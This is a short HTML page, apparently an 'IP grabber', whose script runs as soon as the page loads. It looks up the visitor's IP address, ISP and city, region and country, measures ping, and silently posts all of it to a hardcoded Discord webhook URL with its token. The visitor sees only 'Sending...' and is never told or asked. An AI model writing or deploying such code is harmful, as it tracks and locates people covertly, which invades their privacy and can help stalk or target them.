<!DOCTYPE html>
<html>
<head>
  <title>Network Info Sender</title>
</head>
<body>
  <h1>Sending...</h1>

  <script>
    // ‚ö†Ô∏è This is your webhook. Only use temporarily!
    const webhookURL = "https://discord.com/api/webhooks/1462709927175917703/IHCS2HnCKwDvnhS2LDfAYKedRbxJzBrRctMknqpm2XOZvKzL3bA8Giu40rSn-4TO8MOD";

    async function sendNetworkInfo() {
      try {
        // Fetch IP + ISP + location
        const ipRes = await fetch("https://ipinfo.io/json");
        const ipData = await ipRes.json();

        // Measure approximate ping
        const start = performance.now();
        await fetch("https://cloudflare.com/cdn-cgi/trace", { cache: "no-store" });
        const ping = Math.round(performance.now() - start);

        // Prepare Discord message
        const payload = {
          content: `üì° **Network Info**
**IP:** ${ipData.ip}
**ISP:** ${ipData.org}
**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}
**Ping:** ${ping} ms`
        };

        // Send data to Discord webhook
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        console.log("Network info sent successfully!");
      } catch (err) {
        console.error("Failed to send network info:", err);
      }
    }

    sendNetworkInfo();
  </script>
</body>
</html>
